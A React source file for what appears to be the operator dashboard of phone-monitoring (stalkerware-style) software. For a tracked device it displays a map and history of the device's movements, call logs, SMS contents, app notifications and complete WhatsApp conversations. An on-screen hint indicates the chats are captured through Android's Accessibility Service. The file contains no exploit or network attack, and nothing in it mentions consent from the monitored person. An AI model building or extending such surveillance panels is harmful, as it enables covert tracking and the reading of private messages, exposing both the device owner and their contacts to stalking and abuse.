import { useEffect, useRef, useState } from 'react'
import { useParams, useNavigate } from 'react-router-dom'
import { MapContainer, TileLayer, Marker, Popup, Polyline, useMap } from 'react-leaflet'
import L from 'leaflet'
import {
  getLocations, getCallLogs, getSmsLogs, getWhatsApp, getWhatsAppChats,
  LocationDto, CallLogDto, SmsDto, WhatsAppDto, WhatsAppChatDto
} from '../api/api'

type Tab = 'map' | 'calls' | 'sms' | 'wa_notifs' | 'wa_chats'

const iconSelected = L.divIcon({
  className: '',
  html: '<div style="width:16px;height:16px;background:#ef4444;border:3px solid #fff;border-radius:50%;box-shadow:0 0 6px rgba(0,0,0,.5)"></div>',
  iconSize: [16, 16], iconAnchor: [8, 8],
})
const iconLatest = L.divIcon({
  className: '',
  html: '<div style="width:14px;height:14px;background:#4f46e5;border:3px solid #fff;border-radius:50%;box-shadow:0 0 6px rgba(0,0,0,.4)"></div>',
  iconSize: [14, 14], iconAnchor: [7, 7],
})

function FlyToLocation({ target }: { target: [number, number] | null }) {
  const map = useMap()
  const prev = useRef<string>('')
  useEffect(() => {
    if (!target) return
    const key = target.join(',')
    if (key === prev.current) return
    prev.current = key
    map.flyTo(target, Math.max(map.getZoom(), 15), { duration: 0.8 })
  }, [target, map])
  return null
}

const callType = (t: number) => t === 1 ? '\u{1F4F2} Incoming' : t === 2 ? '\u{1F4E4} Outgoing' : '\u274C Missed'
const smsType  = (t: number) => t === 1 ? '\u{1F4E9} Inbox' : '\u{1F4E4} Sent'
const fmt      = (ms: number) => new Date(ms).toLocaleString()

const TH = ({ children }: { children: React.ReactNode }) => (
  <th className="px-4 py-3 text-left text-xs font-semibold text-gray-500 uppercase tracking-wide bg-gray-50 border-b border-gray-200">
    {children}
  </th>
)
const TD = ({ children, className = '' }: { children: React.ReactNode; className?: string }) => (
  <td className={`px-4 py-3 text-sm text-gray-700 border-b border-gray-100 align-top ${className}`}>
    {children}
  </td>
)

const TABS: { key: Tab; label: string }[] = [
  { key: 'map',       label: '\u{1F5FA} Location' },
  { key: 'calls',     label: '\u{1F4DE} Calls' },
  { key: 'sms',       label: '\u{1F4AC} SMS' },
  { key: 'wa_notifs', label: '\u{1F514} Notifications' },
  { key: 'wa_chats',  label: '\u{1F4AC} WA Chats' },
]

export default function DevicePage() {
  const { id }   = useParams<{ id: string }>()
  const nav      = useNavigate()
  const deviceId = Number(id)

  const [tab,         setTab]         = useState<Tab>('map')
  const [selectedLoc, setSelectedLoc] = useState<LocationDto | null>(null)
  const [locations,   setLocations]   = useState<LocationDto[]>([])
  const [calls,       setCalls]       = useState<CallLogDto[]>([])
  const [sms,         setSms]         = useState<SmsDto[]>([])
  const [whatsapp,    setWhatsapp]    = useState<WhatsAppDto[]>([])
  const [waChats,     setWaChats]     = useState<WhatsAppChatDto[]>([])
  const [activeChat,  setActiveChat]  = useState<string | null>(null)
  const msgEndRef = useRef<HTMLDivElement>(null)

  useEffect(() => {
    getLocations(deviceId).then(r => setLocations(r.data)).catch(() => {})
    getCallLogs(deviceId).then(r => setCalls(r.data)).catch(() => {})
    getSmsLogs(deviceId).then(r => setSms(r.data)).catch(() => {})
    getWhatsApp(deviceId).then(r => setWhatsapp(r.data)).catch(() => {})
    getWhatsAppChats(deviceId).then(r => setWaChats(r.data)).catch(() => {})
  }, [deviceId])

  // Auto-scroll to bottom when active chat messages change
  useEffect(() => {
    msgEndRef.current?.scrollIntoView({ behavior: 'smooth' })
  }, [activeChat, waChats])

  // Build unique chat list sorted by most recent message
  const chatList = Object.values(
    waChats.reduce<Record<string, { chat: string; lastMsg: string; lastTime: number; unread: number }>>((acc, m) => {
      if (!acc[m.chat]) {
        acc[m.chat] = { chat: m.chat, lastMsg: m.message, lastTime: m.timestamp, unread: 0 }
      } else if (m.timestamp > acc[m.chat].lastTime) {
        acc[m.chat].lastMsg  = m.message
        acc[m.chat].lastTime = m.timestamp
      }
      return acc
    }, {})
  ).sort((a, b) => b.lastTime - a.lastTime)

  const activeMsgs = waChats
    .filter(m => m.chat === activeChat)
    .sort((a, b) => a.timestamp - b.timestamp)

  const latest = locations[0]
  const path: [number, number][] = locations.map(l => [l.latitude, l.longitude])

  return (
    <div className="h-screen flex flex-col bg-gray-50">
      {/* Header */}
      <header className="bg-white border-b border-gray-200 px-6 py-4 flex items-center gap-4 flex-shrink-0">
        <button
          onClick={() => nav('/')}
          className="text-indigo-600 hover:text-indigo-800 font-semibold text-sm transition-colors"
        >
          &larr; Devices
        </button>
        <h1 className="text-lg font-bold text-gray-900">Device #{deviceId}</h1>
      </header>

      <main className={`flex-1 flex flex-col overflow-hidden ${tab === 'wa_chats' ? 'p-4' : 'p-6 overflow-y-auto'}`}>
        {/* Tabs */}
        <div className="flex flex-wrap gap-2 mb-5">
          {TABS.map(t => (
            <button
              key={t.key}
              onClick={() => setTab(t.key)}
              className={`px-4 py-2 rounded-lg text-sm font-semibold border transition-colors ${
                tab === t.key
                  ? 'bg-indigo-600 text-white border-indigo-600'
                  : 'bg-white text-gray-600 border-gray-200 hover:border-indigo-300 hover:text-indigo-600'
              }`}
            >
              {t.label}
            </button>
          ))}
        </div>

        {/* â”€â”€â”€ MAP â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */}
        {tab === 'map' && (
          <>
            <div className="rounded-xl overflow-hidden shadow-sm mb-5">
              <MapContainer
                center={latest ? [latest.latitude, latest.longitude] : [39.9, 32.8]}
                zoom={latest ? 14 : 6}
                style={{ height: 460 }}
              >
                <TileLayer url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png" />
                <FlyToLocation target={selectedLoc ? [selectedLoc.latitude, selectedLoc.longitude] : null} />
                {path.length > 1 && <Polyline positions={path} color="#4f46e5" weight={3} opacity={0.5} />}
                {locations.map((l, i) => {
                  const isSel = selectedLoc?.timestamp === l.timestamp
                  const isLatest = i === 0 && !isSel
                  if (!isSel && !isLatest) return null
                  return (
                    <Marker key={l.timestamp} position={[l.latitude, l.longitude]} icon={isSel ? iconSelected : iconLatest}>
                      <Popup>
                        {isSel ? '\u{1F4CD} Selected' : '\u{1F535} Latest'}<br />
                        {fmt(l.timestamp)}<br />
                        {l.latitude.toFixed(6)}, {l.longitude.toFixed(6)}<br />
                        Accuracy: {l.accuracy.toFixed(0)} m
                      </Popup>
                    </Marker>
                  )
                })}
              </MapContainer>
            </div>

            <h3 className="text-sm font-bold text-gray-700 mb-3">&#x1F4CD; Location History ({locations.length})</h3>
            <div className="bg-white rounded-xl shadow-sm overflow-hidden">
              <table className="w-full border-collapse">
                <thead><tr><TH>#</TH><TH>Date & Time</TH><TH>Latitude</TH><TH>Longitude</TH><TH>Accuracy</TH></tr></thead>
                <tbody>
                  {locations.map((l, i) => {
                    const isSel = selectedLoc?.timestamp === l.timestamp
                    return (
                      <tr
                        key={i}
                        onClick={() => setSelectedLoc(isSel ? null : l)}
                        className={`cursor-pointer transition-colors ${
                          isSel ? 'bg-red-50' : i === 0 ? 'bg-indigo-50' : 'hover:bg-gray-50'
                        }`}
                      >
                        <TD>{isSel ? '\u{1F4CD} Selected' : i === 0 ? '\u{1F535} Latest' : i + 1}</TD>
                        <TD>{fmt(l.timestamp)}</TD>
                        <TD>{l.latitude.toFixed(6)}</TD>
                        <TD>{l.longitude.toFixed(6)}</TD>
                        <TD>{l.accuracy.toFixed(0)} m</TD>
                      </tr>
                    )
                  })}
                </tbody>
              </table>
            </div>
          </>
        )}

        {/* â”€â”€â”€ CALLS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */}
        {tab === 'calls' && (
          <div className="bg-white rounded-xl shadow-sm overflow-hidden">
            <table className="w-full border-collapse">
              <thead><tr><TH>Contact</TH><TH>Number</TH><TH>Type</TH><TH>Duration</TH><TH>Date</TH></tr></thead>
              <tbody>
                {calls.map((c, i) => (
                  <tr key={i} className="hover:bg-gray-50">
                    <TD>{c.name || '\u2014'}</TD>
                    <TD>{c.number}</TD>
                    <TD>{callType(c.type)}</TD>
                    <TD>{c.duration}s</TD>
                    <TD>{fmt(c.date)}</TD>
                  </tr>
                ))}
                {calls.length === 0 && <tr><td colSpan={5} className="px-4 py-8 text-center text-gray-400 text-sm">No call logs yet.</td></tr>}
              </tbody>
            </table>
          </div>
        )}

        {/* â”€â”€â”€ SMS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */}
        {tab === 'sms' && (
          <div className="bg-white rounded-xl shadow-sm overflow-hidden">
            <table className="w-full border-collapse">
              <thead><tr><TH>From/To</TH><TH>Message</TH><TH>Type</TH><TH>Date</TH></tr></thead>
              <tbody>
                {sms.map((m, i) => (
                  <tr key={i} className="hover:bg-gray-50">
                    <TD>{m.address}</TD>
                    <TD>{m.body}</TD>
                    <TD>{smsType(m.type)}</TD>
                    <TD>{fmt(m.date)}</TD>
                  </tr>
                ))}
                {sms.length === 0 && <tr><td colSpan={4} className="px-4 py-8 text-center text-gray-400 text-sm">No SMS logs yet.</td></tr>}
              </tbody>
            </table>
          </div>
        )}

        {/* â”€â”€â”€ WA NOTIFS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */}
        {tab === 'wa_notifs' && (
          <div className="bg-white rounded-xl shadow-sm overflow-hidden">
            <table className="w-full border-collapse">
              <thead><tr><TH>App</TH><TH>Sender</TH><TH>Message</TH><TH>Time</TH></tr></thead>
              <tbody>
                {whatsapp.map((w, i) => (
                  <tr key={i} className="hover:bg-gray-50">
                    <TD>
                      <div className="flex items-center gap-2">
                        {w.appIcon
                          ? <img src={`data:image/png;base64,${w.appIcon}`} alt="" className="w-6 h-6 rounded" />
                          : <span className="text-lg">{'\u{1F4E6}'}</span>
                        }
                        <span className="font-medium text-gray-800">{w.appName || w.appPackage}</span>
                      </div>
                    </TD>
                    <TD className="font-medium">{w.sender}</TD>
                    <TD>{w.message}</TD>
                    <TD>{fmt(w.timestamp)}</TD>
                  </tr>
                ))}
                {whatsapp.length === 0 && <tr><td colSpan={4} className="px-4 py-8 text-center text-gray-400 text-sm">No notifications yet.</td></tr>}
              </tbody>
            </table>
          </div>
        )}

        {/* â”€â”€â”€ WA CHATS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */}
        {/* WA CHATS */}
        {tab === 'wa_chats' && (
          waChats.length === 0 ? (
            <div className="bg-white rounded-xl shadow-sm flex items-center justify-center flex-1 text-gray-400 text-sm">
              No chat messages yet. Enable Accessibility Service and open a WhatsApp chat.
            </div>
          ) : (
            <div className="bg-white rounded-xl shadow-sm overflow-hidden flex flex-1 min-h-0">
              {/* Left: contact list */}
              <div className="w-72 flex-shrink-0 border-r border-gray-100 flex flex-col">
                <div className="px-4 py-3 bg-[#f0f2f5] border-b border-gray-200">
                  <p className="text-sm font-semibold text-gray-700">Conversations</p>
                  <p className="text-xs text-gray-400">{chatList.length} chat{chatList.length !== 1 ? 's' : ''}</p>
                </div>
                <div className="overflow-y-auto flex-1">
                  {chatList.map(c => (
                    <button
                      key={c.chat}
                      onClick={() => setActiveChat(c.chat)}
                      className={`w-full text-left flex items-center gap-3 px-4 py-3 border-b border-gray-50 transition-colors ${
                        activeChat === c.chat ? 'bg-[#f0f2f5]' : 'hover:bg-gray-50'
                      }`}
                    >
                      <div className="w-10 h-10 rounded-full bg-emerald-500 flex-shrink-0 flex items-center justify-center text-white font-bold text-sm">
                        {c.chat.charAt(0).toUpperCase()}
                      </div>
                      <div className="min-w-0 flex-1">
                        <div className="flex items-center justify-between">
                          <span className="text-sm font-semibold text-gray-800 truncate">{c.chat}</span>
                          <span className="text-xs text-gray-400 flex-shrink-0 ml-1">
                            {new Date(c.lastTime).toLocaleDateString([], { day: '2-digit', month: '2-digit' })}
                          </span>
                        </div>
                        <p className="text-xs text-gray-500 truncate mt-0.5">{c.lastMsg}</p>
                      </div>
                    </button>
                  ))}
                </div>
              </div>

              {/* Right: chat window */}
              {activeChat === null ? (
                <div className="flex-1 flex flex-col items-center justify-center text-gray-400 bg-[#f0f2f5]">
                  <div className="text-5xl mb-3">&#x1F4AC;</div>
                  <p className="text-sm font-medium">Select a conversation</p>
                </div>
              ) : (
                <div className="flex-1 flex flex-col min-w-0">
                  {/* Chat header */}
                  <div className="px-4 py-3 bg-[#f0f2f5] border-b border-gray-200 flex items-center gap-3 flex-shrink-0">
                    <div className="w-9 h-9 rounded-full bg-emerald-500 flex items-center justify-center text-white font-bold text-sm">
                      {activeChat.charAt(0).toUpperCase()}
                    </div>
                    <div>
                      <p className="text-sm font-semibold text-gray-800">{activeChat}</p>
                      <p className="text-xs text-gray-500">{activeMsgs.length} messages</p>
                    </div>
                  </div>

                  {/* Messages */}
                  <div
                    className="flex-1 overflow-y-auto px-4 py-4 space-y-1"
                    style={{ backgroundColor: '#efeae2' }}
                  >
                    {activeMsgs.map((m, i) => {
                      const isMe = m.sender === '__me__'
                      const showSender = !isMe && (i === 0 || activeMsgs[i - 1].sender !== m.sender)
                      return (
                        <div key={i} className={`flex ${isMe ? 'justify-end' : 'justify-start'}`}>
                          <div
                            className={`max-w-xs lg:max-w-md xl:max-w-lg px-3 py-2 rounded-lg shadow-sm text-sm relative ${
                              isMe
                                ? 'bg-[#d9fdd3] text-gray-800 rounded-br-none'
                                : 'bg-white text-gray-800 rounded-bl-none'
                            }`}
                          >
                            {showSender && (
                              <p className="text-xs font-semibold text-emerald-600 mb-1">{m.sender}</p>
                            )}
                            <p className="leading-snug break-words">{m.message}</p>
                            <p className="text-right text-[10px] text-gray-400 mt-1 -mb-0.5">
                              {new Date(m.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                            </p>
                          </div>
                        </div>
                      )
                    })}
                    <div ref={msgEndRef} />
                  </div>
                </div>
              )}
            </div>
          )
        )}
      </main>
    </div>
  )
}

